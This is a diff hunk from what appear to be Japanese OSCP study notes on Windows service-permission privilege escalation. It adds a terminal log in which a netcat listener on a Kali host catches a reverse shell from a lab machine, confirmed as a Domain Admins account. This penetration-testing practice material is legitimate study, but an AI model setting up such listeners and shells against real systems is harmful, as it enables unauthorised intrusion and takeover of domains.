@@ -121,5 +121,44 @@ NT権限で実行されるサービスの安全でないファイルパーミッ
   net localgroup Administrators
   ```
 
+  ```
+  ┌──(kali㉿kali)-[~/Documents/OSCP/21.ActiveDirectoryAttacks]
+  └─$ nc -lnvp 12345
+  listening on [any] 12345 ...
+  connect to [192.168.119.131] from (UNKNOWN) [192.168.131.171] 49732
+  Microsoft Windows [Version 10.0.17763.1757]
+  (c) 2018 Microsoft Corporation. All rights reserved.
+  
+  C:\Windows\system32>whoami
+  whoami                                                                                                                      
+  exam\zensvc                                                                                                                 
+                                                                                                                              
+  C:\Windows\system32>whoami groups                                                                                           
+  whoami groups                                                                                                               
+  ERROR: Invalid argument/option - 'groups'.                                                                                  
+  Type "WHOAMI /?" for usage.                                                                                                 
+                                                                                                                              
+  C:\Windows\system32>whoami /groups                                                                                          
+  whoami /groups
+  
+  GROUP INFORMATION
+  -----------------
+  
+  Group Name                                  Type             SID                                         Attributes                                                     
+  =========================================== ================ =========================================== ===============================================================
+  Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group             
+  BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group             
+  BUILTIN\Administrators                      Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
+  NT AUTHORITY\SERVICE                        Well-known group S-1-5-6                                     Mandatory group, Enabled by default, Enabled group             
+  CONSOLE LOGON                               Well-known group S-1-2-1                                     Mandatory group, Enabled by default, Enabled group             
+  NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group             
+  NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group             
+  LOCAL                                       Well-known group S-1-2-0                                     Mandatory group, Enabled by default, Enabled group             
+  EXAM\Domain Admins                          Group            S-1-5-21-88558181-3850747640-3669402957-512 Mandatory group, Enabled by default, Enabled group             
+  Authentication authority asserted identity  Well-known group S-1-18-1                                    Mandatory group, Enabled by default, Enabled group             
+  EXAM\Denied RODC Password Replication Group Alias            S-1-5-21-88558181-3850747640-3669402957-572 Mandatory group, Enabled by default, Enabled group, Local Group
+  Mandatory Label\High Mandatory Level        Label            S-1-16-12288  
+  ```
+  
   
 
